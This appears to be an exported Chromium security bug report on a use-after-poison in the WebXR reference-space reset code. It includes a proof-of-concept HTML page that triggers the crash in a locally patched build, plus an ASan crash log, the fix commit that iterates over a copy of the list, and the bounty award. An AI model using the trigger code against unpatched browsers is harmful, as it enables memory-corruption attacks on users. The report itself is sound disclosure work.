# Security: Use-After-Poison in XRFrameProvider

| Field | Value |
|-------|-------|
| **Issue ID** | [40053209](https://issues.chromium.org/issues/40053209) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>XR |
| **Platforms** | Android |
| **Reporter** | bo...@gmail.com |
| **Assignee** | al...@chromium.org |
| **Created** | 2020-08-31 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

<https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/modules/xr/xr_session.cc;l=1864>  

void XRSession::OnMojoSpaceReset() {  

for (const auto& reference\_space : reference\_spaces\_) {  

reference\_space->OnReset(); ------- [1]  

}  

}

Some 'reference\_space' can be added to 'reference\_spaces\_' while 'OnReset()' method is invoked. [1]  

This is because JavaScript callback can be executed when the function [1] is called. it leads to heap Use-After-Free.  

But I couldn't find a way to trigger the `XRSession::OnMojoSpaceReset` method without VR hardware or sensor. So I patched some code to trigger the vulnerability.

<https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/modules/xr/xr_frame_provider.cc;l=415>  

void XRFrameProvider::ProcessScheduledFrame(  

device::mojom::blink::XRFrameDataPtr frame\_data,  

double high\_res\_now\_ms) {  

DVLOG(2) << **FUNCTION** << ": frame\_id\_=" << frame\_id\_  

<< ", high\_res\_now\_ms=" << high\_res\_now\_ms;

TRACE\_EVENT2("gpu", "XRFrameProvider::ProcessScheduledFrame", "frame",  

frame\_id\_, "timestamp", high\_res\_now\_ms);

LocalFrame\* frame = xr\_->GetFrame();  

if (!frame) {  

return;  

}

if (!xr\_->IsFrameFocused() && !immersive\_session\_) {  

return; // Not currently focused, so we won't expose poses (except to  

// immersive sessions).  

}

if (immersive\_session\_) {

```
[...]  

if (frame_data && frame_data->mojo_space_reset) {  
    immersive_session_->OnMojoSpaceReset(); ------- [2]  
  }  

[...]  

```

} else {  

// In the process of fulfilling the frame requests for each session they are

```
[...]   

if (inline_frame_data && inline_frame_data->mojo_space_reset) {  
    session->OnMojoSpaceReset(); -------- [3]  
  }  

```

There are two paths to call vulnerable function. ([2], [3])  

[2] is used to process an immersive session and [3] is used for inline session.  

I couldn't create an immersive session without VR hardware,  

So I patched [3] so that I can force `OnMojoSpaceReset()` method to be invoked. (I couldn't even make a inline\_frame\_data)

<https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/renderer/modules/xr/xr_session.cc;l=469>  

ScriptPromise XRSession::requestReferenceSpace(  

ScriptState\* script\_state,  

const String& type,  

ExceptionState& exception\_state) {  

DVLOG(2) << **func**;

[...]

if (sensorless\_session\_ && --------- [4]  

requested\_type != device::mojom::blink::XRReferenceSpaceType::kViewer) {  

exception\_state.ThrowDOMException(DOMExceptionCode::kNotSupportedError,  

kReferenceSpaceNotSupported);  

return ScriptPromise();  

}

[...]

if (!IsFeatureEnabled(type\_as\_feature.value())) { -------- [5]  

exception\_state.ThrowDOMException(DOMExceptionCode::kNotSupportedError,  

kReferenceSpaceNotSupported);  

return ScriptPromise();  

}

And I didn't have a any sensor for inline session So I patched [4], [5] to get reference space, not the viewer type  

Finally, I can trigger the vulnerability without VR hardware or sensor.  

I will upload my diff file and poc.html.

poc.html

<html>
<script type="text/javascript">
async function main() {
in\_canvas = document.body.appendChild(document.createElement('canvas'));
webgl = in\_canvas.getContext('webgl', { xrCompatible: true });
```
	session = await navigator.xr.requestSession('inline');  
	session.requestAnimationFrame(function(){})  

	viewer1 = await session.requestReferenceSpace('local');  
	await session.requestReferenceSpace('local');  
	await session.requestReferenceSpace('local');  
	await session.requestReferenceSpace('local');  
	viewer1.onreset = async function() {  
		for (var i = 0; i < 0x100; i++) {  
			a = await session.requestReferenceSpace('viewer');  
		}  
	}  

	session.updateRenderState({   
		baseLayer: new XRWebGLLayer(session, webgl)  
	});  
}  

```
</script>
<body onload="main();">
</body>
</html>
# Asan Log youngjoo@ubuntu:~/Desktop/chrome/src/out/Asan$ ASAN\_OPTIONS=detect\_odr\_violation=0 ./chrome ~/Desktop/c.html [1370:1370:0831/061334.371911:INFO:content\_main\_runner\_impl.cc(992)] Chrome is running in full browser mode. [1370:1370:0831/061335.465114:WARNING:account\_consistency\_mode\_manager.cc(196)] Desktop Identity Consistency cannot be enabled as no OAuth client ID and client secret have been configured. [1401:1401:0831/061335.624136:INFO:sandbox\_bpf.cc(300)] Indirect branch speculation can not be controled by prctl.2 [1401:1417:0831/061335.623902:INFO:sandbox\_bpf.cc(300)] Indirect branch speculation can not be controled by prctl.2 [1428:1:0831/061336.351085:INFO:sandbox\_bpf.cc(300)] Indirect branch speculation can not be controled by prctl.2 [1429:1:0831/061336.364610:INFO:sandbox\_bpf.cc(300)] Indirect branch speculation can not be controled by prctl.2 [1470:1:0831/061337.746109:INFO:sandbox\_bpf.cc(300)] Indirect branch speculation can not be controled by prctl.2

==1==ERROR: AddressSanitizer: use-after-poison on address 0x7e96f145e5b0 at pc 0x7f1d6f267bd1 bp 0x7fff2f3da420 sp 0x7fff2f3da418  

READ of size 8 at 0x7e96f145e5b0 thread T0 (chrome)  

#0 0x7f1d6f267bd0 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6c18bd0)  

#1 0x7f1d6f299134 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6c4a134)  

#2 0x7f1d6f28ae50 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6c3be50)  

#3 0x7f1d6f1bb164 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6b6c164)  

#4 0x7f1d6f1f303b (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6ba403b)  

#5 0x7f1d6f1f2c72 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6ba3c72)  

#6 0x7f1d6f1f2a43 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6ba3a43)  

#7 0x7f1d6f1f29b8 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6ba39b8)  

#8 0x7f1d6c1cb48c (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3b7c48c)  

#9 0x7f1d6c237a2c (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3be8a2c)  

#10 0x7f1d6c234ee3 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3be5ee3)  

#11 0x7f1d6c236c19 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3be7c19)  

#12 0x7f1d6c236943 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3be7943)  

#13 0x7f1d6c236761 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3be7761)  

#14 0x7f1d6c236718 (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x3be7718)  

#15 0x7f1df555195c (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0x49395c)  

#16 0x7f1df5a1bc2a (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0x95dc2a)  

#17 0x7f1df5add522 (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0xa1f522)  

#18 0x7f1df5adba9f (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0xa1da9f)  

#19 0x7f1df5addefc (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0xa1fefc)  

#20 0x7f1df5716d47 (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0x658d47)  

#21 0x7f1df5adfebd (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0xa21ebd)  

#22 0x7f1df5ae03c0 (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0xa223c0)  

#23 0x7f1df58e9eb1 (/home/youngjoo/Desktop/chrome/src/out/Asan/libbase.so+0x82beb1)  

#24 0x7f1dde39f2aa (/home/youngjoo/Desktop/chrome/src/out/Asan/libcontent.so+0xd0562aa)  

#25 0x7f1ddee81edc (/home/youngjoo/Desktop/chrome/src/out/Asan/libcontent.so+0xdb38edc)  

#26 0x7f1ddee82c64 (/home/youngjoo/Desktop/chrome/src/out/Asan/libcontent.so+0xdb39c64)  

#27 0x7f1ddee855d7 (/home/youngjoo/Desktop/chrome/src/out/Asan/libcontent.so+0xdb3c5d7)  

#28 0x7f1ddee781f2 (/home/youngjoo/Desktop/chrome/src/out/Asan/libcontent.so+0xdb2f1f2)  

#29 0x7f1df61a4295 (/home/youngjoo/Desktop/chrome/src/out/Asan/libembedder.so+0xb3295)  

#30 0x7f1ddee818c4 (/home/youngjoo/Desktop/chrome/src/out/Asan/libcontent.so+0xdb388c4)  

#31 0x5647c9cf9c8d (/home/youngjoo/Desktop/chrome/src/out/Asan/chrome+0x801fc8d)  

#32 0x5647c9cf9881 (/home/youngjoo/Desktop/chrome/src/out/Asan/chrome+0x801f881)  

#33 0x7f1d5cc77b96 (/lib/x86\_64-linux-gnu/libc.so.6+0x21b96)

Address 0x7e96f145e5b0 is a wild pointer.  

SUMMARY: AddressSanitizer: use-after-poison (/home/youngjoo/Desktop/chrome/src/out/Asan/libblink\_modules.so+0x6c18bd0)  

Shadow bytes around the buggy address:  

0x0fd35e283c60: 00 00 00 f7 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fd35e283c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fd35e283c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fd35e283c90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0fd35e283ca0: 00 00 00 00 00 00 00 00 fc fc fc fc fc fc f7 00  

=>0x0fd35e283cb0: 00 00 00 f7 f7 f7[f7]f7 f7 f7 f7 f7 f7 00 00 00  

0x0fd35e283cc0: f7 00 00 00 f7 00 00 f7 f7 f7 f7 00 00 f7 00 00  

0x0fd35e283cd0: f7 00 00 00 00 f7 00 00 00 f7 f7 f7 f7 f7 f7 f7  

0x0fd35e283ce0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fd35e283cf0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x0fd35e283d00: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==1==ABORTING

**VERSION**  

Chrome Version: Version 85.0.4183.83, stable  

Operating System: Any (Tested on Ubuntu 18.04.05)

**REPRODUCTION CASE**  

To trigger the vulnerability using the above html, you must apply the patch.  

I tested it on chromium 85.0.4183.83.

**CREDIT INFORMATION**  

Reporter credit: YoungJoo Lee(@ashuu\_lee) of Raon Whitehat

## Attachments

- [patch.diff](attachments/patch.diff) (text/plain, 2.6 KB)
- [poc.html](attachments/poc.html) (text/plain, 788 B)

## Timeline

### ts...@chromium.org (2020-08-31)

alcooper - looks like you've done some work on XRFrameProvider recently, could you take a look or re-assign as approriate? Thanks!

[Monorail components: Internals>XR]

### al...@chromium.org (2020-08-31)

While the blink code runs on every platform, the only code that currently passes the "mojo_space_reset" boolean is
1) The WPTs
2)  Android/GVR
(https://source.chromium.org/search?q=mojo_space_reset%20-f:out)

Updating Platforms accordingly.
tsepez@ CC'd as FYI in case this impacts any of the other bits.

I'll get a fix for this out shortly.

### [Deleted User] (2020-08-31)

Setting milestone and target because of Security_Impact=Stable and medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-08-31)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### al...@chromium.org (2020-08-31)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-08-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/9e136e1a72d47ff594be26d2d7406af0bb91e4fa

commit 9e136e1a72d47ff594be26d2d7406af0bb91e4fa
Author: Alexander Cooper <alcooper@chromium.org>
Date: Mon Aug 31 23:39:05 2020

Update ReferenceSpace reset to operate on a copy

When a reference space's origin is reset, an event is dispatched to the
page. This allows additional javascript to run, which could request a
new reference space. Depending on the timing of this new reference space
request returning, it would cause the reference_spaces_ list to be
modified, and thus invalidate the iterators.

Fix this by iterating over a copy of the list.

Fixed: 1123522
Change-Id: I121a5fa3dde1cfc18abbef579148a2ace86f73f5
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2385885
Auto-Submit: Alexander Cooper <alcooper@chromium.org>
Commit-Queue: Klaus Weidner <klausw@chromium.org>
Reviewed-by: Klaus Weidner <klausw@chromium.org>
Cr-Commit-Position: refs/heads/master@{#803311}

[modify] https://crrev.com/9e136e1a72d47ff594be26d2d7406af0bb91e4fa/third_party/blink/renderer/modules/xr/xr_session.cc


### [Deleted User] (2020-09-01)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-08)

[Empty comment from Monorail migration]

### [Deleted User] (2020-09-08)

Requesting merge to beta M86 because latest trunk commit (803311) appears to be after beta branch point (800218).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-09-08)

This bug requires manual review: M86's targeted beta branch promotion date has already passed, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), geohsu@(ChromeOS),  pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### go...@chromium.org (2020-09-08)

+adetaylor@ for M86 merge review

### ad...@chromium.org (2020-09-08)

Merge approved to M86, branch 4240.

### ad...@chromium.org (2020-09-08)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-09-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/036dff5d170d987c659f82383844e10da8fb8697

commit 036dff5d170d987c659f82383844e10da8fb8697
Author: Alexander Cooper <alcooper@chromium.org>
Date: Tue Sep 08 22:23:09 2020

Update ReferenceSpace reset to operate on a copy

When a reference space's origin is reset, an event is dispatched to the
page. This allows additional javascript to run, which could request a
new reference space. Depending on the timing of this new reference space
request returning, it would cause the reference_spaces_ list to be
modified, and thus invalidate the iterators.

Fix this by iterating over a copy of the list.

(cherry picked from commit 9e136e1a72d47ff594be26d2d7406af0bb91e4fa)

Fixed: 1123522
Change-Id: I121a5fa3dde1cfc18abbef579148a2ace86f73f5
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2385885
Auto-Submit: Alexander Cooper <alcooper@chromium.org>
Commit-Queue: Klaus Weidner <klausw@chromium.org>
Reviewed-by: Klaus Weidner <klausw@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#803311}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2399243
Reviewed-by: Alexander Cooper <alcooper@chromium.org>
Commit-Queue: Alexander Cooper <alcooper@chromium.org>
Cr-Commit-Position: refs/branch-heads/4240@{#538}
Cr-Branched-From: f297677702651916bbf65e59c0d4bbd4ce57d1ee-refs/heads/master@{#800218}

[modify] https://crrev.com/036dff5d170d987c659f82383844e10da8fb8697/third_party/blink/renderer/modules/xr/xr_session.cc


### ad...@google.com (2020-09-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-09-09)

Congratulations! The VRP panel has decided to award $7,500 for this report. Someone from our finance team will get in touch.

### ad...@google.com (2020-09-10)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-01)

[Empty comment from Monorail migration]

### ad...@google.com (2020-10-05)

[Empty comment from Monorail migration]

### ad...@google.com (2020-11-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1123522?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053209)*
